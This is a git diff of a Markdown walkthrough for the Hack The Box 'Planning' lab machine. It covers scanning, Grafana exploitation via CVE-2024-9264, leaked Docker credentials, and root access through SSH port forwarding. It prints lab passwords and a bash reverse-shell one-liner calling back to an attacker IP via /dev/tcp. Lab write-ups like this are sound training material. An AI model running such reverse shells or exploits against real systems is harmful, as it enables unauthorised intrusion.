@@ -18,6 +18,8 @@ The Planning machine involves:
 - Docker container escape  
 - Privilege escalation via SSH port forwarding and command injection  
 
+![Planning Page](screenshots/planning.png)
+
 ---
 
 ## 🛠 Tools Used
@@ -38,63 +40,65 @@ The Planning machine involves:
 nmap 10.10.11.68
 ````
 
-![Nmap Scan](nmap-scan.png)
+![Nmap Output](screenshots/nmap-scan.png)
 
 ---
 
 ### 2️⃣ Virtual Host Setup
 
-![Planning Web Page](planning.png)
-
-Edited `/etc/hosts`:
+Modified `/etc/hosts`:
 
 ```
 10.10.11.68 planning.htb
 ```
 
+![Host Added](screenshots/added-host.png)
+
 ---
 
 ### 3️⃣ Subdomain Discovery
 
-![FFUF Scan](fuff-scan.png)
+Used FFUF to find subdomains:
 
 ```bash
 ffuf -u http://planning.htb -H "Host:FUZZ.planning.htb" \
 -w /usr/share/seclists/Discovery/DNS/namelist.txt -fs 178 -t 100
 ```
 
+![FFUF Scan](screenshots/fuff-scan.png)
+![Host Added Again](screenshots/added-host1.png)
+
 Discovered: `grafana.planning.htb`
-Updated `/etc/hosts`:
-![Updated Hosts](added-host1.png)
-![Another Hosts Entry](added-host.png)
 
 ---
 
-### 4️⃣ Grafana Exploitation (CVE-2024-9264)
+### 4️⃣ Grafana Login
 
 Visited: `http://grafana.planning.htb`
-![Grafana Login](grafana-login.png)
-![Grafana Version](grafana-version.png)
 
-**Credentials:**
+Used credentials:
 
 ```
 Username: admin
 Password: 0D5oT70Fq13EvB5r
 ```
 
-Used exploit:
-[https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit](https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit)
+![Login Page](screenshots/grafana-login.png)
+![Version Info](screenshots/grafana-version.png)
 
-Start listener:
+---
+
+### 5️⃣ Exploiting Grafana (CVE-2024-9264)
+
+Started a reverse shell listener:
 
 ```bash
 nc -lvnp 9001
 ```
 
-![Listener](listener.png)
+![Listener](screenshots/listener.png)
 
-Run exploit:
+Ran exploit:
 
 ```bash
 python3 poc.py --url http://grafana.planning.htb \
@@ -104,14 +108,16 @@ python3 poc.py --url http://grafana.planning.htb \
 --reverse-port 9001
 ```
 
-![Exploit Run](python-exploit.png)
-![Exploited](exploited.png)
+![Exploit Script](screenshots/python-exploit.png)
+![Reverse Shell Access](screenshots/exploited.png)
 
-✅ Reverse shell obtained.
+✅ Reverse shell obtained!
 
 ---
 
-### 5️⃣ Docker Escape
+### 6️⃣ Docker Escape
+
+Checked environment variables:
 
 ```bash
 env
@@ -124,77 +130,83 @@ Username: enzo
 Password: RioTecRANDEntANT!
 ```
 
-![Found Credentials](found-username-password.png)
+![Found Creds](screenshots/found-username-password.png)
 
-SSH into host:
+SSH login:
 
 ```bash
 ssh enzo@10.10.11.68
 ```
 
-![SSH Login](ssh.png)
+![SSH Access](screenshots/ssh.png)
+
+Captured user flag:
 
 ```bash
 cat /home/enzo/user.txt
 ```
 
-![User Flag](userflag.png)
+![User Flag](screenshots/userflag.png)
 
 ---
 
-### 6️⃣ Privilege Escalation
+### 7️⃣ Privilege Escalation
 
-Ran linpeas:
-
-```bash
-./linpeas.sh
-```
-
-Found crontab:
+Ran linPEAS and discovered crontab entry:
 
 ```bash
 cat /opt/crontabs/crontab.db
 ```
 
-![linPEAS Crontab](linpeas-crontab.png)
-![Found Root Credentials](found-credentials.png)
-
-Used:
+Found:
 
 ```
 Username: root
 Password: P4ssw0rdS0pRi0T3c
 ```
 
-Local port 8000 found:
-![Local Port](port-locally.png)
+![LinPEAS Output](screenshots/linpeas-crontab.png)
+![Root Credentials](screenshots/found-credentials.png)
 
-SSH Port Forward:
+---
+
+### 8️⃣ Internal Service & Reverse Shell to Root
+
+Discovered local port 8000:
+
+![Local Port](screenshots/port-locally.png)
+
+Port forwarding with SSH:
 
 ```bash
 ssh -L 8000:localhost:8000 enzo@planning.htb
 ```
 
-![Port Forwarding](port-forwarding.png)
-Visited: `http://localhost:8000`
-![Visited 8000](visited8000.png)
+![Port Forwarding](screenshots/port-forwarding.png)
 
-Injected shell:
+Visited: `http://localhost:8000`
+
+![Visited 8000](screenshots/visited8000.png)
+
+Injected reverse shell payload:
 
 ```bash
 bash -c 'exec bash -i &>/dev/tcp/10.10.14.96/8888 <&1'
 ```
 
-![Shell Injected](injected.png)
+![Injection](screenshots/injected.png)
 
-Started listener:
+Set up listener:
 
 ```bash
 nc -lvnp 8888
 ```
 
-![Listener for Root](setup-listener.png)
-![Got Root Shell](gained-rootshell.png)
+![Listener Ready](screenshots/setup-listener.png)
+
+Got root shell! 🎉
+
+![Root Shell](screenshots/gained-rootshell.png)
 
 ---
 
@@ -205,28 +217,28 @@ cat /home/enzo/user.txt
 cat /root/root.txt
 ```
 
-![User Flag](user-flag.png)
-![Root Flag](root-flag.png)
+![User Flag](screenshots/user-flag.png)
+![Root Flag](screenshots/root-flagl.png)
 
 ---
 
 ## ✅ Conclusion
 
-This machine demonstrated a full attack chain:
+The Planning machine demonstrated a solid exploitation path:
 
 * Default credentials in Grafana
-* Docker environment variable leaks
-* Misconfigured internal services
-* Port forwarding + command injection
-
-Great for practicing real-world exploitation chains!
+* Environment variable leaks in Docker
+* SSH access and internal port forwarding
+* Reverse shell injection via internal admin panel
 
 ---
 
 ## 🔗 References
 
 * [CVE-2024-9264 – Grafana RCE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-9264)
-* [Exploit Script](https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit)
-* [HackTricks](https://book.hacktricks.xyz/)
+* [Exploit PoC by z3k0sec](https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit)
+* [HackTricks Book](https://book.hacktricks.xyz/)
 * [Medium Write-up](https://medium.com/@ypopova3/planning-hackthebox-fd3d5fcb8fc7)
+
+
 
